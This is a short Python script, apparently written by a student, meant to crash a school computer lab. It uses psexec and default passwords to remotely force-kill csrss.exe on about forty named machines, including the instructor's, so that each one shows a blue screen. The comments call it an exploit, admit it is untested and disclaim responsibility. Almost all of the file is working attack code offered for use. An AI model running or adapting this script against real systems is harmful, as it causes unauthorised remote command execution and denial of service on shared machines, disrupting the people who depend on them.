# Uses Python 3.
# Exploits vulnerability in windows to trigger a blue screen when csrss.exe is killed.
# Gives Blue Screens of Death to all lab computers with default passwords.
# I have no way of testing this, lol.
# Make sure psexec.exe is in your PATH.
# This is usually harmless, but I won't be responsible for what happens if you use it.

import subprocess;

pcList = ["INSTRUCTOR", "AUTO11", "AUTO12", "AUTO21", "AUTO22", "AUTO31", "AUTO32", "AUTO41", "AUTO42", "AUTO51", "AUTO52", "AUTO61", "AUTO62", "AUTO71", "AUTO72", "DECEP11", "DECEP12", "DECEP21", "DECEP22", "DECEP31", "DECEP32", "DECEP41", "DECEP42", "DECEP51", "DECEP52", "DECEP61", "DECEP62", "MAX11", "MAX12", "MAX21", "MAX22", "MAX31", "MAX32", "MAX41", "MAX42", "MAX51", "MAX52", "MAX61", "MAX62"];
command = " -accepteula cmd.exe /c taskkill /f /im csrss.exe";

for i in range(len(pcList)):
    subprocess.Popen("""psexec.exe \\\\""" + pcList[i] + command, shell = True);
